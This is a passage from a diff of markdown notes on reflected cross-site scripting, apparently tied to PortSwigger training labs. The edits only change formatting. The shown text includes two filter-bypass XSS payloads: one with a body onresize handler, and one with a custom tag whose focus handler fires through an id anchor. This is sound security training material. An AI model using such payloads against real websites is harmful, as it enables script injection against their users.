@@ -167,14 +167,12 @@ And the final code will look like this.
 <br>
 Bruteforce for getting allowed tags.
 <br>
-Check this Portswigger lab for details: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked.
+***Check this Portswigger lab for details:*** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked.
 ```
 "><body onresize=alert(1337)>
 ```
-<br>
 **Reflected XSS into HTML context with all tags blocked except custom ones**
-<br>
-***Key Note***
+Key Note
 ```tabindex="1"```, ```id="a1"```, ```#a1```
 ```
 <custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
